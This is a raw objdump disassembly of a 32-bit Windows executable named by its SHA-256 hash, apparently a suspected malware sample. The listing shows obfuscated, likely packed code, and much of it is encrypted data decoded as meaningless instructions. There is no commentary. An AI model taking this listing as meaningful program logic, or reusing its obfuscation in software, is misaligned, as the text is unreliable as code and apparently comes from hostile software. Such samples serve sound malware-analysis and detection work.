
4d2178a3a01eb845fbba30d0491e1d7bdb120e46b2189dc0d6ea5dd2ab408677.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	add    DWORD PTR ds:0x4282d7,edx
  40100c:	mov    eax,DWORD PTR [ebp-0x50]
  40100f:	cmp    DWORD PTR ds:0x42837f,0x0
  401016:	mov    DWORD PTR ds:0x42834f,0x2f64
  401020:	not    ecx
  401022:	jmp    0x401482
  401027:	mov    DWORD PTR ds:0x42829f,0x2f16
  401031:	not    ecx
  401033:	cmp    DWORD PTR ds:0x42837f,0x0
  40103a:	jne    0x401066
  401040:	push   0x2daf
  401045:	call   DWORD PTR ds:0x428dd4
  40104b:	mov    ecx,DWORD PTR ds:0x428407
  401051:	sub    DWORD PTR ds:0x4282bb,ecx
  401057:	movzx  ecx,WORD PTR ds:0x4282e7
  40105e:	and    DWORD PTR ds:0x4282a3,ecx
  401064:	add    ecx,ecx
  401066:	mov    ecx,DWORD PTR ds:0x42822f
  40106c:	xor    edx,edx
  40106e:	add    edx,DWORD PTR ds:0x428327
  401074:	sub    ecx,edx
  401076:	xor    ecx,DWORD PTR [ecx+edx*1]
  401079:	adc    DWORD PTR ds:0x4283df,0x71ea
  401083:	mov    ecx,DWORD PTR ds:0x42830b
  401089:	mov    edx,DWORD PTR ds:0x42840b
  40108f:	sub    edx,ecx
  401091:	xor    ecx,DWORD PTR [ecx+edx*1]
  401094:	adc    DWORD PTR ds:0x42836f,ebx
  40109a:	and    DWORD PTR ds:0x4282b7,0x4c59
  4010a4:	jmp    0x401482
  4010a9:	jae    0x4010a7
  4010ab:	ins    DWORD PTR es:[edi],dx
  4010ac:	mov    cl,0x5b
  4010ae:	and    DWORD PTR [ebx],esi
  4010b0:	cmp    ebp,DWORD PTR [edx+0xfbefcb3]
  4010b6:	cmp    eax,0x1818aa57
  4010bb:	sbb    BYTE PTR [eax],bl
  4010bd:	sahf   
  4010be:	adc    bl,BYTE PTR [eax]
  4010c0:	sbb    BYTE PTR [eax-0x3fd8ec2f],ch
  4010c6:	mov    ?,eax
  4010c8:	mov    cl,0xf9
  4010ca:	cmp    dh,ah
  4010cc:	cs sbb bh,dl
  4010cf:	xchg   ecx,eax
  4010d0:	mov    cl,0x10
  4010d2:	or     ecx,edi
  4010d4:	pop    ss
  4010d5:	jno    0x401135
  4010d7:	sbb    eax,0x648fe8fa
  4010dc:	(bad)  
  4010de:	mov    esp,0xa611f941
  4010e3:	and    eax,0x732a514e
  4010e8:	inc    edx
  4010e9:	mov    ds:0x95d8e3bf,eax
  4010ee:	cld    
  4010ef:	clc    
  4010f0:	sub    eax,0xcd39b412
  4010f5:	dec    eax
  4010f6:	pop    esp
  4010f7:	push   edx
  4010f8:	and    al,0x9
  4010fa:	fcomp  QWORD PTR [ebx-0x3e921a10]
  401100:	dec    esi
  401101:	inc    edx
  401102:	jp     0x4010dc
  401104:	clc    
  401105:	xchg   esp,eax
  401106:	xor    BYTE PTR [ebx],0x95
  401109:	jle    0x40110b
  40110b:	sti    
  40110c:	xchg   esi,eax
  40110d:	mov    DWORD PTR [ebx],ecx
  40110f:	arpl   WORD PTR fs:[ebp+esi*4-0x6c5f57e5],sp
  401117:	jmp    0x4010a3
  401119:	adc    ecx,ebp
  40111b:	mov    BYTE PTR [esi+ebx*1],ch
  40111e:	sub    DWORD PTR [ebp+0x24651311],ecx
  401124:	mov    ds:0xcf454e45,eax
  401129:	push   es
  40112a:	mov    ah,0x20
  40112c:	inc    esp
  40112d:	add    ecx,edi
  40112f:	inc    esp
  401130:	add    BYTE PTR [ebx-0x3c],ch
  401133:	xor    DWORD PTR [ebx+edi*2+0x3e22e241],edx
  40113a:	repnz lock mov ds:0x37602ff8,eax
  401141:	mov    al,ds:0x862c1207
  401146:	dec    esp
  401147:	ins    DWORD PTR es:[edi],dx
  401148:	stos   BYTE PTR es:[edi],al
  401149:	lahf   
  40114a:	retf   0x7659
  40114d:	add    al,0x82
  40114f:	lock cmp cl,0x5a
  401153:	sbb    ebp,esi
  401155:	(bad)  
  401156:	into   
  401157:	pop    edi
  401158:	pop    ss
  401159:	cmp    al,ah
  40115b:	push   es
  40115c:	inc    edi
  40115d:	inc    ecx
  40115e:	and    ah,dl
  401160:	mov    al,ds:0xcf8af36b
  401165:	xlat   BYTE PTR ds:[ebx]
  401166:	jl     0x4011ac
  401168:	pushf  
  401169:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40116a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40116b:	or     bl,BYTE PTR [esi]
  40116d:	xor    eax,0xd2cdb5e3
  401172:	imul   esp,ebp,0xc68e22bd
  401178:	push   ds
  401179:	rol    edi,1
  40117b:	sahf   
  40117c:	stos   DWORD PTR es:[edi],eax
  40117d:	mov    ebx,0xb8a57b16
  401182:	fs jnp 0x40116f
  401185:	fcom   QWORD PTR [esi+0x559958e8]
  40118b:	xor    bl,BYTE PTR ds:0xea83af20
  401191:	ror    BYTE PTR [ecx+0x4d],1
  401194:	out    dx,eax
  401195:	in     eax,0x1a
  401197:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401198:	dec    edi
  401199:	shl    BYTE PTR [edi+edi*4-0x155ea9a],0x9
  4011a1:	shr    BYTE PTR [ecx+eiz*4],0x56
  4011a5:	adc    eax,0xe8a1cc3c
  4011aa:	dec    edx
  4011ab:	scas   al,BYTE PTR es:[edi]
  4011ac:	add    DWORD PTR [ebx-0x5e109db2],edx
  4011b2:	popa   
  4011b3:	sahf   
  4011b4:	push   esi
  4011b5:	popa   
  4011b6:	in     al,0x5f
  4011b8:	sub    edi,DWORD PTR [eax+0x2f3babbd]
  4011be:	push   eax
  4011bf:	push   0x8a38468e
  4011c4:	push   eax
  4011c5:	xchg   edi,eax
  4011c6:	xor    esp,edi
  4011c8:	dec    ebx
  4011c9:	push   es
  4011ca:	test   eax,0x54275e1e
  4011cf:	stc    
  4011d0:	and    BYTE PTR [ebp-0x2f1bb5f8],0xd5
  4011d7:	jo     0x4011bb
  4011d9:	pop    es
  4011da:	jnp    0x4011ef
  4011dc:	not    ch
  4011de:	mov    esi,0xcc43507e
  4011e3:	lea    edx,[edx+0x2b]
  4011e6:	cmp    al,0x71
  4011e8:	xor    al,0x6f
  4011ea:	ins    BYTE PTR es:[edi],dx
  4011eb:	jmp    0xe40a:0x1db03ca8
  4011f2:	aas    
  4011f3:	rcl    DWORD PTR [ecx-0x46644e22],1
  4011f9:	outs   dx,BYTE PTR ds:[esi]
  4011fa:	fcomp  QWORD PTR [esi]
  4011fc:	mov    bh,0xfd
  4011fe:	mov    dl,0x44
  401200:	xchg   dl,dh
  401202:	imul   edi,DWORD PTR [esi+0x206dfe0e],0xd4ed34cf
  40120c:	jne    0x401287
  40120e:	test   BYTE PTR [edi+ebx*1+0x5f],bh
  401212:	retf   
  401213:	cmp    ecx,DWORD PTR [edi+0x4a6e49d7]
  401219:	mov    edx,0x168c7f13
  40121e:	pusha  
  40121f:	sbb    ch,BYTE PTR [ebx]
  401221:	xchg   ecx,eax
  401222:	mov    bl,0xa9
  401224:	sub    dh,cl
  401226:	fadd   DWORD PTR [eax]
  401228:	or     al,0x18
  40122b:	scas   eax,DWORD PTR es:[edi]
  40122c:	mov    bl,0x9a
  40122e:	xor    eax,0x68dd36ba
  401233:	add    eax,0x2635782d
  401238:	arpl   cx,sp
  40123a:	lea    esi,[edx-0x5f0b132c]
  401240:	jp     0x4012b6
  401242:	movaps xmm0,xmm0
  401245:	iret   
  401246:	out    dx,eax
  401247:	adc    dl,ch
  401249:	or     ah,BYTE PTR [ebp-0x3c7b90d8]
  40124f:	mov    ch,0xe3
  401251:	mov    edx,0x30a02efc
  401256:	jne    0x401271
  401258:	lock jg 0x40122f
  40125b:	cwde   
  40125c:	dec    esp
  40125d:	stos   BYTE PTR es:[edi],al
  40125e:	mov    al,0xb7
  401260:	pop    ebp
  401261:	jecxz  0x401205
  401263:	test   edx,ebx
  401265:	bound  eax,QWORD PTR [ecx-0x19]
  401268:	sub    DWORD PTR [edi-0x69],edi
  40126b:	mov    esp,0x46645a83
  401270:	adc    DWORD PTR [ecx],esi
  401272:	xchg   esp,eax
  401273:	lds    edi,FWORD PTR ds:0xf5368a16
  401279:	outs   dx,BYTE PTR ds:[esi]
  40127a:	ss and eax,0xada834e0
  401280:	mov    ecx,0xbac8ebcb
  401285:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401286:	sub    dl,BYTE PTR ds:0x362a1e8c
  40128c:	mov    cl,0xc2
  40128e:	outs   dx,DWORD PTR ds:[esi]
  40128f:	call   0xa3e:0x711bbee2
  401296:	test   eax,0xc1285893
  40129b:	add    al,al
  40129d:	out    0xbe,eax
  40129f:	add    al,0xe7
  4012a1:	mov    ch,0x5d
  4012a3:	das    
  4012a4:	les    esp,FWORD PTR [ebx]
  4012a6:	in     eax,dx
  4012a7:	mov    ch,0x7
  4012a9:	xchg   ecx,eax
  4012aa:	lds    ecx,FWORD PTR [edi+0x2f]
  4012ad:	xor    eax,0x25bf84df
  4012b2:	jl     0x401264
  4012b4:	fbld   TBYTE PTR [esi]
  4012b6:	push   ds
  4012b7:	cmc    
  4012b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4012b9:	scas   eax,DWORD PTR es:[edi]
  4012ba:	adc    esp,DWORD PTR [ebp*8+0x22de66af]
  4012c1:	fwait
  4012c2:	inc    ebp
  4012c3:	in     eax,dx
  4012c4:	mov    ds:0xc0b60b0b,al
  4012c9:	js     0x4012dc
  4012cb:	je     0x401293
  4012cd:	out    0x8,eax
  4012cf:	pop    DWORD PTR [edx+0x1af86451]
  4012d5:	fld    DWORD PTR [eax-0x3c]
  4012d8:	icebp  
  4012d9:	jae    0x401273
  4012db:	mov    edx,0x881e72ea
  4012e0:	mov    ecx,0xd9ac62ab
  4012e5:	test   BYTE PTR [ebx-0x601c5687],cl
  4012eb:	or     bh,dl
  4012ed:	sbb    ebx,DWORD PTR [eax+0x2]
  4012f0:	test   al,0x86
  4012f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012f3:	jge    0x40134d
  4012f5:	cmovo  edi,DWORD PTR [ebx-0x14]
  4012f9:	mov    DWORD PTR [ebx+ebx*8],esi
  4012fc:	jae    0x401283
  4012fe:	or     eax,0x5b00f993
  401303:	outs   dx,DWORD PTR ds:[esi]
  401304:	jb     0x4012f6
  401306:	out    0x2b,eax
  401308:	std    
  401309:	push   cs
  40130a:	pop    esp
  40130b:	test   DWORD PTR [edi-0x7f5ee19f],eax
  401311:	out    dx,eax
  401312:	mov    edx,DWORD PTR [esi]
  401314:	in     al,0xe
  401316:	icebp  
  401317:	push   esp
  401318:	mov    cl,0xb5
  40131a:	push   ds
  40131b:	jo     0x401322
  40131d:	push   0x32
  40131f:	lods   eax,DWORD PTR ds:[esi]
  401320:	ror    DWORD PTR [edx+0x7217429b],cl
  401326:	sti    
  401327:	sbb    al,0xaf
  401329:	push   ebp
  40132a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40132b:	cs inc ecx
  40132d:	mov    eax,ds:0xe5368a13
  401332:	sub    edi,DWORD PTR [edi]
  401334:	pop    esi
  401335:	mul    BYTE PTR [esi-0x7f6cfae9]
  40133b:	cmp    BYTE PTR [eax],cl
  40133d:	or     ah,BYTE PTR [ecx-0x2d]
  401340:	or     eax,0x2b780fd9
  401345:	sub    DWORD PTR [ebx],esp
  401347:	jno    0x401306
  401349:	fstp   QWORD PTR ds:0x375297e6
  40134f:	jle    0x4012d5
  401351:	pop    es
  401352:	repz fucom st(5)
  401355:	jle    0x4013c5
  401357:	mov    edx,0xdb94ad35
  40135c:	dec    esp
  40135d:	xlat   BYTE PTR ds:[ebx]
  40135e:	push   0x19
  401360:	inc    edi
  401361:	stc    
  401362:	repz sahf 
  401364:	mov    DWORD PTR [ebx],0x82f9057f
  40136a:	and    ecx,DWORD PTR [edi+ecx*1]
  40136d:	inc    edi
  40136e:	mov    cl,0xbb
  401370:	xlat   BYTE PTR ds:[ebx]
  401371:	and    al,0x1b
  401373:	xchg   ebp,eax
  401374:	xor    eax,DWORD PTR [edi]
  401376:	(bad)  
  401377:	ins    BYTE PTR es:[edi],dx
  401378:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401379:	out    dx,al
  40137a:	push   esi
  40137b:	out    0xef,eax
  40137d:	push   edx
  40137e:	pop    ds
  40137f:	pushf  
  401380:	cmp    eax,0x8489b352
  401385:	and    ch,bl
  401387:	fnsave [ebp-0x2a191803]
  40138d:	mov    al,ds:0x33ec3213
  401392:	in     al,dx
  401393:	imul   ecx,DWORD PTR [ebx-0x5ee5daa],0x5f
  40139a:	mov    BYTE PTR [esi],bh
  40139c:	ins    DWORD PTR es:[edi],dx
  40139d:	clc    
  40139e:	pop    ebp
  40139f:	or     bh,BYTE PTR [edx-0x417453fb]
  4013a5:	adc    DWORD PTR [ebx+eiz*1],edi
  4013a8:	int3   
  4013a9:	popa   
  4013aa:	add    esi,DWORD PTR [ecx-0x1e]
  4013ad:	add    BYTE PTR [edi-0x546d0285],ch
  4013b3:	(bad)  
  4013b4:	jl     0x401364
  4013b6:	pop    es
  4013b7:	aad    0xf0
  4013b9:	stc    
  4013ba:	mov    edi,DWORD PTR [ebp-0x19]
  4013bd:	sbb    esi,DWORD PTR [edx-0x7f]
  4013c0:	or     esi,DWORD PTR [eax-0x44]
  4013c3:	mov    DWORD PTR ds:0x4446901c,edi
  4013c9:	sti    
  4013ca:	retf   0xfb2
  4013cd:	and    BYTE PTR [ecx-0x1d],ah
  4013d0:	jg     0x401360
  4013d2:	call   0xabb03ea7
  4013d7:	stos   DWORD PTR es:[edi],eax
  4013d8:	je     0x401370
  4013da:	fld    DWORD PTR ds:0x2063374d
  4013e0:	mov    dh,BYTE PTR [eax-0x53]
  4013e3:	ret    
  4013e4:	scas   al,BYTE PTR es:[edi]
  4013e5:	or     esi,DWORD PTR [ebx-0x69]
  4013e8:	pop    ds
  4013e9:	fdivr  st,st(3)
  4013eb:	xlat   BYTE PTR ds:[ebx]
  4013ec:	arpl   bp,ax
  4013ee:	(bad)  
  4013ef:	neg    BYTE PTR [edi-0x46]
  4013f2:	int    0x98
  4013f4:	rcr    BYTE PTR ss:[esi-0xfea88e5],cl
  4013fb:	(bad)  
  4013fc:	sar    DWORD PTR ds:0xd1601a83,1
  401402:	nop
  401403:	ins    DWORD PTR es:[edi],dx
  401404:	mov    dl,0xa7
  401406:	sar    BYTE PTR [edi+0x0],0xbc
  40140a:	js     0x4013fc
  40140c:	jbe    0x401485
  40140e:	sahf   
  40140f:	test   BYTE PTR [ebp+esi*4+0x6e],0x98
  401414:	adc    DWORD PTR [edx],ebp
  401416:	mov    ?,WORD PTR [ebx]
  401418:	aad    0x89
  40141a:	icebp  
  40141b:	int3   
  40141c:	lds    edx,FWORD PTR [esp+ebx*4+0x60494b6e]
  401423:	in     eax,0x8e
  401425:	push   es
  401426:	aaa    
  401427:	jne    0x4013ff
  401429:	mov    bh,0xec
  40142b:	mov    DWORD PTR [edi+0x4815ac93],edx
  401431:	push   eax
  401432:	(bad)  [ebx]
  401434:	and    DWORD PTR [ecx],0xfffffffa
  401437:	lods   al,BYTE PTR ds:[esi]
  401438:	mov    ds:0xb82345a8,al
  40143d:	xchg   ebx,eax
  40143e:	sub    cl,BYTE PTR [edi+0x72fde04a]
  401444:	(bad)
  401448:	mov    ebx,0x793477de
  40144d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40144e:	mov    bh,0x90
  401450:	(bad)  
  401451:	int3   
  401452:	iret   
  401453:	xchg   ecx,eax
  401454:	and    al,0x59
  401456:	or     al,0x76
  401458:	pop    esp
  401459:	nop
  40145a:	xchg   edi,eax
  40145b:	popf   
  40145c:	cmc    
  40145d:	xchg   ebx,eax
  40145e:	jg     0x401437
  401460:	popf   
  401461:	or     BYTE PTR [eax],dl
  401463:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401464:	arpl   WORD PTR [esp+ecx*4-0x2ea83c88],bp
  40146b:	sub    BYTE PTR [ebx+0x2fd6b78],bh
  401471:	jge    0x40144f
  401473:	push   edx
  401474:	sbb    al,0x91
  401476:	lods   al,BYTE PTR es:[esi]
  401478:	(bad)  
  401479:	and    ecx,DWORD PTR fs:[ebp+0x1d]
  40147d:	xchg   ebp,eax
  40147e:	sub    BYTE PTR [edi-0x1b],al
  401481:	xlat   BYTE PTR ds:[ebx]
  401482:	mov    ecx,DWORD PTR [ebp-0x4c]
  401485:	mov    edx,DWORD PTR [ebp-0x50]
  401488:	sub    eax,edx
  40148a:	mov    DWORD PTR ds:0x4283cf,edx
  401490:	push   edi
  401491:	mov    edi,DWORD PTR [ebp-0x4c]
  401494:	mov    DWORD PTR [ebp-0x50],eax
  401497:	mov    edx,0x488c
  40149c:	sbb    ecx,edi
  40149e:	mov    DWORD PTR [ebp-0x4c],ecx
  4014a1:	mov    edx,DWORD PTR ds:0x42830b
  4014a7:	mov    edx,DWORD PTR [edx]
  4014a9:	and    DWORD PTR ds:0x42835b,edx
  4014af:	or     DWORD PTR [ebp-0x50],0xca78cc41
  4014b6:	or     DWORD PTR [ebp-0x4c],0x9c1b89e8
  4014bd:	and    DWORD PTR ds:0x42828b,0x6649
  4014c7:	mov    eax,DWORD PTR [ebp-0x58]
  4014ca:	add    ecx,0xa44
  4014d0:	mov    ecx,DWORD PTR [ebp-0x54]
  4014d3:	cmp    DWORD PTR ds:0x4282b3,0x0
  4014da:	mov    DWORD PTR ds:0x42828f,ecx
  4014e0:	mov    DWORD PTR ds:0x428353,0x3ae4
  4014ea:	mov    edi,0x1ebc
  4014ef:	mov    edx,0x7e4f
  4014f4:	jmp    0x40154f
  4014f9:	not    DWORD PTR ds:0x4281cb
  4014ff:	mov    edx,0x300f
  401504:	cmp    DWORD PTR ds:0x4282b3,0x0
  40150b:	jae    0x401543
  401511:	push   0x1b93
  401516:	call   DWORD PTR ds:0x428dd8
  40151c:	mov    edx,DWORD PTR ds:0x42832b
  401522:	xor    edi,edi
  401524:	or     edi,DWORD PTR ds:0x4283a3
  40152a:	sub    edx,edi
  40152c:	or     edx,DWORD PTR [edx+edi*1]
  40152f:	xor    edx,edx
  401531:	add    edx,DWORD PTR ds:0x4281ff
  401537:	mov    edi,DWORD PTR ds:0x4283a7
  40153d:	sub    edi,edx
  40153f:	imul   edx,DWORD PTR [edx+edi*1]
  401543:	and    edi,0x359a
  401549:	or     edi,0x3261
  40154f:	mov    edx,DWORD PTR [ebp-0x58]
  401552:	mov    edi,DWORD PTR [ebp-0x54]
  401555:	jmp    0x401933
  40155a:	outs   dx,DWORD PTR ds:[esi]
  40155b:	add    eax,0x3a5a4a0b
  401560:	das    
  401561:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401562:	out    dx,al
  401563:	sbb    ebx,DWORD PTR [ebp-0x1a112190]
  401569:	stos   BYTE PTR es:[edi],al
  40156a:	sahf   
  40156b:	adc    bl,BYTE PTR [eax]
  40156d:	sbb    BYTE PTR [esi+0x68181812],bl
  401573:	mov    BYTE PTR ds:0xd56e0d29,bh
  401579:	push   edi
  40157a:	hlt    
  40157b:	js     0x401512
  40157d:	fisttp QWORD PTR [edx+edx*8]
  401580:	dec    di
  401582:	cmc    
  401583:	and    BYTE PTR ss:[ebx+0x55fa0521],al
  40158a:	mov    ecx,0xf4f523d6
  40158f:	test   edx,ebx
  401591:	sub    eax,0x924cc8af
  401596:	lods   eax,DWORD PTR ds:[esi]
  401597:	rcl    DWORD PTR [ebx+0xe],cl
  40159a:	mov    cl,0x2e
  40159c:	add    DWORD PTR [ebp+0x6dc92699],eax
  4015a2:	xchg   edi,eax
  4015a3:	push   edi
  4015a4:	xchg   ebx,eax
  4015a5:	xor    eax,0xce3c5133
  4015aa:	cli    
  4015ab:	xchg   edx,eax
  4015ac:	dec    ebp
  4015ad:	loope  0x4015a4
  4015af:	add    ebx,ecx
  4015b1:	add    DWORD PTR [esi],ecx
  4015b3:	ret    
  4015b4:	mov    esi,0xfe1c5c60
  4015b9:	imul   esi,DWORD PTR [edx+0x62056367],0x47
  4015c0:	mov    WORD PTR [esp+edi*2],?
  4015c3:	adc    al,0x1b
  4015c5:	cmp    BYTE PTR [ebx+0x685a8a56],0xc3
  4015cc:	mov    ah,0xcd
  4015ce:	mov    ds:0x9d96fc35,eax
  4015d3:	cs jmp 0xe970:0x2aa9a1e3
  4015db:	ror    BYTE PTR [eax+0x50],1
  4015de:	(bad)  
  4015df:	hlt    
  4015e0:	fs push ebp
  4015e2:	mov    bh,0xc9
  4015e4:	dec    eax
  4015e5:	xchg   edi,eax
  4015e6:	cmp    al,0xc3
  4015e8:	adc    al,0xea
  4015ea:	sub    DWORD PTR gs:[edx-0x1c],esp
  4015ee:	and    ah,0xdb
  4015f1:	scas   al,BYTE PTR es:[edi]
  4015f2:	ja     0x4015e5
  4015f4:	jne    0x4015bf
  4015f6:	lahf   
  4015f7:	push   cs
  4015f8:	aam    0xbb
  4015fa:	pusha  
  4015fb:	leave  
  4015fc:	cs stos DWORD PTR es:[edi],eax
  4015fe:	mov    bh,0xf5
  401600:	add    esp,ecx
  401602:	iret   
  401603:	adc    al,0x68
  401605:	hlt    
  401606:	je     0x40164e
  401608:	jg     0x40158d
  40160a:	add    eax,0x39e56dad
  40160f:	aam    0xaa
  401611:	add    esp,DWORD PTR [esi-0x48]
  401614:	inc    esi
  401615:	rol    ah,1
  401617:	sbb    DWORD PTR [edi-0x2621837a],edx
  40161d:	inc    BYTE PTR [eax-0x34]
  401620:	imul   ebx,DWORD PTR [ebp-0x19],0xd557acc2
  401627:	in     al,0xf8
  401629:	and    eax,0x82327cc8
  40162e:	fwait
  40162f:	xchg   DWORD PTR [eax-0x16],ebx
  401632:	jno    0x40168b
  401634:	retf   0x2f56
  401637:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401638:	(bad)  
  40163a:	fmul   QWORD PTR [ebx]
  40163c:	inc    ebp
  40163d:	out    0xc0,al
  40163f:	dec    edi
  401640:	rol    BYTE PTR [edi],cl
  401642:	shr    DWORD PTR [edx],cl
  401644:	or     al,0x26
  401646:	repz mov al,ds:0xff463f79
  40164c:	cld    
  40164d:	jno    0x4015d6
  40164f:	xlat   BYTE PTR ds:[ebx]
  401650:	popa   
  401651:	cmp    al,0x82
  401653:	daa    
  401654:	add    dh,BYTE PTR [ebx]
  401656:	shl    BYTE PTR [eax+0x539a1567],1
  40165c:	pop    edi
  40165d:	fstp   QWORD PTR [ebx-0x1a09f4b1]
  401663:	jmp    0x40161e
  401665:	nop
  401666:	jmp    0x8d018ba6
  40166b:	dec    ecx
  40166c:	push   cs
  40166d:	and    BYTE PTR [edi+0x9],al
  401670:	retf   
  401671:	inc    eax
  401672:	out    0x50,al
  401674:	and    eax,0x5f15bd89
  401679:	imul   ecx,DWORD PTR [eax-0x1eb05fcd],0xd46cc6b3
  401683:	jle    0x4016b1
  401685:	loope  0x401700
  401687:	adc    DWORD PTR [edx+0x33e77aba],0x1aa69ced
  401691:	jae    0x4016f2
  401693:	repz rcl BYTE PTR [edi-0x636d1f4a],cl
  40169a:	lahf   
  40169b:	sub    bh,BYTE PTR [ebp-0x5d]
  40169e:	(bad)  
  40169f:	push   ecx
  4016a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016a1:	sub    al,0xea
  4016a3:	ins    BYTE PTR es:[edi],dx
  4016a4:	ds scas eax,DWORD PTR es:[edi]
  4016a6:	add    DWORD PTR [eax-0x7a3d909c],0x4a
  4016ad:	repz into 
  4016af:	mov    bh,0x7e
  4016b1:	sub    eax,0xd37b0a4d
  4016b6:	sahf   
  4016b7:	test   DWORD PTR [ecx],edx
  4016b9:	je     0x4016ea
  4016bb:	loop   0x40167f
  4016bd:	xchg   ecx,eax
  4016be:	xchg   ebp,eax
  4016bf:	mov    esi,0x89e8fbfc
  4016c4:	cwde   
  4016c5:	sub    DWORD PTR [ebx+0x952475a],esp
  4016cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016cc:	mov    BYTE PTR [eax],ch
  4016ce:	pop    ecx
  4016cf:	cmp    cl,BYTE PTR [eax+edx*4-0x2b9c1eb6]
  4016d6:	into   
  4016d7:	adc    BYTE PTR [ebp+0x41],ah
  4016da:	dec    ecx
  4016db:	add    BYTE PTR ds:0xd098bfb6,0xcd
  4016e2:	mov    eax,DWORD PTR [esi]
  4016e4:	enter  0x852e,0x78
  4016e8:	xchg   DWORD PTR [ebx+0x1d],edi
  4016eb:	ins    BYTE PTR es:[edi],dx
  4016ec:	xlat   BYTE PTR ds:[ebx]
  4016ed:	addr16 retf 0x9a76
  4016f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016f2:	cmp    DWORD PTR [edi+eax*2],ebx
  4016f5:	xchg   DWORD PTR [edx-0x2c],esp
  4016f8:	scas   eax,DWORD PTR es:[edi]
  4016f9:	(bad)  
  4016fa:	clc    
  4016fb:	(bad)  
  4016fc:	cs mov edi,0x9a129930
  401702:	push   esi
  401703:	sahf   
  401704:	mov    esp,0xaac929e4
  401709:	mov    DWORD PTR [esi],esp
  40170b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40170c:	push   ds
  40170d:	ret    
  40170e:	imul   esi,DWORD PTR [ebp-0x5fe56662],0xffffffac
  401715:	add    al,0xfa
  401717:	sahf   
  401718:	or     edx,DWORD PTR [esi-0x6bcaa3eb]
  40171e:	das    
  40171f:	adc    al,0x88
  401721:	sub    al,ch
  401723:	dec    edx
  401724:	jmp    0x4016bd
  401726:	jae    0x40179f
  401728:	jne    0x401704
  40172a:	pop    ss
  40172b:	shl    dh,cl
  40172d:	push   ebp
  40172e:	cs loop 0x4016da
  401731:	sti    
  401732:	ds dec ebx
  401734:	dec    ebx
  401735:	out    dx,al
  401736:	lock adc al,0x44
  401739:	idiv   BYTE PTR [edx]
  40173b:	loopne 0x4016d2
  40173d:	in     al,0x9c
  40173f:	pop    esp
  401740:	cmp    eax,DWORD PTR [esi-0x267d3e50]
  401746:	js     0x4017be
  401748:	or     ebx,DWORD PTR [esi+0x238e718f]
  40174e:	aas    
  40174f:	inc    esi
  401750:	mov    esp,edx
  401752:	push   ss
  401753:	mov    al,0x31
  401755:	or     DWORD PTR ds:0x30191f0e,esi
  40175b:	dec    edx
  40175c:	cld    
  40175d:	mov    ds:0xb103b0ce,al
  401762:	je     0x401752
  401764:	call   0xd0718b47
  401769:	push   es
  40176a:	sub    eax,0xcfb0c54f
  40176f:	mov    al,ds:0xa44de68f
  401774:	stc    
  401775:	jmp    0x9182:0xecf7d46b
  40177c:	pop    edx
  40177d:	mov    ebp,0xeed5ce1b
  401782:	not    BYTE PTR [eax+0x3e]
  401785:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401786:	jmp    0x40175e
  401788:	jl     0x401801
  40178a:	sbb    bh,BYTE PTR [edx]
  40178c:	jmp    0x40175c
  40178e:	or     BYTE PTR [edx-0x32],0x7b
  401792:	div    dh
  401794:	sub    eax,0x1e270bb5
  401799:	adc    edx,DWORD PTR [ebp-0xd]
  40179c:	cmp    esp,edx
  40179e:	push   es
  40179f:	shl    DWORD PTR [edx+0x405826f6],cl
  4017a5:	mov    BYTE PTR [edi+0x15],cl
  4017a8:	pop    ecx
  4017a9:	or     al,0xd9
  4017ab:	xchg   DWORD PTR [edx-0x52],edi
  4017ae:	add    dh,0x4b
  4017b1:	cmp    edx,DWORD PTR [esi-0xa]
  4017b4:	fisub  DWORD PTR [edx]
  4017b6:	cmp    al,0x38
  4017b8:	call   0xdcce5746
  4017bd:	jl     0x40181c
  4017bf:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4017c1:	adc    cl,BYTE PTR [edx-0x2bbac95c]
  4017c7:	jl     0x401805
  4017c9:	xor    esi,eax
  4017cb:	stc    
  4017cc:	sub    eax,0x8ba9dac3
  4017d1:	lds    edi,FWORD PTR [ecx]
  4017d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017d4:	mov    esp,0xbf27c3c9
  4017d9:	arpl   WORD PTR [esi-0x34],cx
  4017dc:	(bad)  
  4017dd:	(bad)  
  4017df:	loope  0x401801
  4017e1:	sbb    al,BYTE PTR [ebx+0x49f4b5a4]
  4017e7:	inc    edi
  4017e8:	shl    esi,1
  4017ea:	mov    ebx,0xda4c6110
  4017ef:	add    BYTE PTR [ebx+ecx*4-0x68d6f8af],0x56
  4017f7:	xchg   edx,eax
  4017f8:	lahf   
  4017f9:	sub    bh,BYTE PTR [edx-0x464ac305]
  4017ff:	pop    ecx
  401800:	xchg   esi,eax
  401801:	loope  0x4017e0
  401803:	xor    BYTE PTR [esi],bh
  401805:	xchg   edx,eax
  401806:	pusha  
  401807:	add    al,0x13
  401809:	or     edx,DWORD PTR [ecx-0x7a]
  40180c:	popa   
  40180d:	mov    ds:0x927161df,al
  401812:	jle    0x4017f6
  401814:	mov    esp,0x3793c9c5
  401819:	fadd   st,st(0)
  40181b:	into   
  40181c:	std    
  40181d:	aad    0xbe
  40181f:	enter  0xd0a,0xc0
  401823:	lea    esp,ds:0xab66d1e6
  401829:	mov    ch,0xc6
  40182b:	jmp    0x4017ef
  40182d:	sub    esi,DWORD PTR [ebx+ecx*2-0x12]
  401831:	sub    DWORD PTR [edx-0x53],eax
  401834:	in     al,0xe9
  401836:	clc    
  401837:	push   ecx
  401838:	adc    cl,ah
  40183a:	repz mov ebp,0x58309ea6
